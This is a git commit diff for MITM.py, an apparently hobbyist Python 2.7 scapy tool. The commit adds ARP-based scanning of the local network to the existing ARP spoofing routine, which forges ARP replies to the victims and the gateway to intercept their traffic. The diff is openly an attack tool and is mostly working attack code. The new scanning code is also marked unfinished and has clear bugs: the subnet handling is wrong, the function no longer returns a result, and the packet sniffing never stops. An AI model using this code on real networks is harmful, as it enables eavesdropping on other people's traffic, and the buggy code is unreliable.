e8a24ac7ad144289f0f5cba8aac0fd7a9dd58115
guykoy123 <guykoy123@gmail.com>
2017-10-25 20:45:01 +0300

    added address scanning (needs fixing)

--- MITM.py
+++ MITM.py
@@ -1,12 +1,14 @@
 #python 2.7
 
-try:
-    import wmi,logging,subprocess,re, threading,time
-    from scapy.all import *
-except ImportError:
 
-    #TODO: handle all cases of missing modules and try to solve
-    print 'a module is missing please check you have all required modules'
+import wmi,logging,re
+from threading import Thread
+from time import sleep
+from scapy.all import *
+# except ImportError:
+#
+#     #TODO: handle all cases of missing modules and try to solve
+#     print 'a module is missing please check you have all required modules'
 
 def getLocalhostAddress():
     """
@@ -18,27 +20,46 @@ def getLocalhostAddress():
     for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1):
         return interface.DefaultIPGateway[0],interface.IPAddress[0],interface.MACAddress,interface.IPSubnet[0]
 
+def get_MAC_Address(pkt):
+    if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at
+        return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
+
+
 def getLocalAddrss(subnetMask,defaultGateway):
     """
     returns a dictionary of all LAN IP addresses and their coresponding MAC address"""
 
 
     #TODO: get all local addresses
+    #all possible ranges for networks
+    low_IP_Range={'255.255.255.252':True,'255.255.255.248':True,'255.255.255.240':True,'255.255.255.224':True,'255.255.255.192':True,'255.255.255.128':True,'255.255.255.0':True}
+    if low_IP_Range[subnetMask]:
+        for i in range(int(subnetMask.split('.')[3]),255):
+            IP_Addr='.'.join(defaultGateway.split('.')[:2])+'.'+str(i) #construct IP address
+            packet=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1,pdst=IP_Addr)
+            pack=sendp(packet)
+            MAC_Addr=sniff(prn=get_MAC_Address, filter="arp", store=0).show()
+            print IP_Addr,MAC_Addr
 
-    """allAddresses = subprocess.check_output(['arp', '-a'])
-    temp=allAddresses.split('ff-ff-ff-ff-ff-ff')
-    localAddrss=temp[0].split('\r\n')[3:-1]
-    ipAddr=re.compile(r'\d+.\d+.\d+.\d+')
-    macAddr=re.compile(r'([0-9A-Fa-f]{2}-){5}([0-9A-Fa-f]{2})')
-    #created regex objects to extract IP and MAC
-    localAddresses=dict()
-    for i in localAddrss:
-        ip=ipAddr.search(i)
-        mac=macAddr.search(i)
-        localAddresses[ip.group()]=mac.group().replace('-',':')#format MAC address for scapy
+    else:
+        for i in range(int(subnetMask.split('.')[2]),255):
+            for j in range(int(subnetMask.split('.')[3]),255):
+                IP_Addr='.'.join(defaultGateway.split('.')[:1])+'.'+str(i)+'.'+str(j) #construct IP address
 
-    #return dict of IP and MAC on LAN
-    return localAddresses"""
+    # allAddresses = subprocess.check_output(['arp', '-a'])
+    # temp=allAddresses.split('ff-ff-ff-ff-ff-ff')
+    # localAddrss=temp[0].split('\r\n')[3:-1]
+    # ipAddr=re.compile(r'\d+.\d+.\d+.\d+')
+    # macAddr=re.compile(r'([0-9A-Fa-f]{2}-){5}([0-9A-Fa-f]{2})')
+    # #created regex objects to extract IP and MAC
+    # localAddresses=dict()
+    # for i in localAddrss:
+    #     ip=ipAddr.search(i)
+    #     mac=macAddr.search(i)
+    #     localAddresses[ip.group()]=mac.group().replace('-',':')#format MAC address for scapy
+    #
+    # #return dict of IP and MAC on LAN
+    # return localAddresses
 
 def arpSpoof(localAddresses,defaultGateway,localMAC):
     """
@@ -56,7 +77,7 @@ def arpSpoof(localAddresses,defaultGateway,localMAC):
                 #send packets
                 sendp(victimPacket)
                 sendp(gatewayPacket)
-        time.sleep(30)
+        sleep(30)
 
 
 
@@ -79,7 +100,7 @@ def main():
     localAddresses=getLocalAddrss(subnetMask,defaultGateway)
     logging.debug('created dictionary with all IP and MAC addresses on LAN')
 
-    arpThread=threading.Thread(target=arpSpoof,args=(localAddresses,defaultGateway,localMAC,))
+    arpThread=Thread(target=arpSpoof,args=(localAddresses,defaultGateway,localMAC,))
     #arpThread.start()
     logging.debug('created thread for ARP spoofing')
 
